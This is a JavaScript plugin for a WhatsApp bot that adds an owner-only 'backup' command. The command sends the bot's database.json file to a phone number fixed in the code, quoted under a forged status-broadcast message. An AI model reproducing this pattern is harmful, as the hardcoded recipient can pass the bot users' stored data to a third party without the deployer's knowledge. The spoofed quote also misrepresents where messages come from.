/*BY https://github.com/Jesus-ofc33*/

import fs from "fs";
let handler = async (m, {conn, usedPrefix: _p}) => {
  let fdoc = {
    key: {
      remoteJid: "status@broadcast",
      participant: "0@s.whatsapp.net",
    },
    message: {
      documentMessage: {
        title: " B A C K U P",
        jpegThumbnail: fs.readFileSync("./Menu2.jpg"),
      },
    },
  };
  let d = new Date();
  let date = d.toLocaleDateString("id", {
    day: "numeric",
    month: "long",
    year: "numeric",
  });
  conn.reply(m.chat, "_. ᩭ✎enviando backup_", m);
  conn.reply("584166718372" + "@s.whatsapp.net", `*🗓️ Database:* ${date}`, null);
  conn.sendFile("584166718372" + "@s.whatsapp.net", fs.readFileSync("./database.json"), "database.json", "", 0, 0, {
    mimetype: "application/json",
    quoted: fdoc,
  });
};

handler.help = ["backup"];
handler.tags = ["owner"];
handler.command = /^(backup)$/i;
handler.rowner = true;

export default handler;
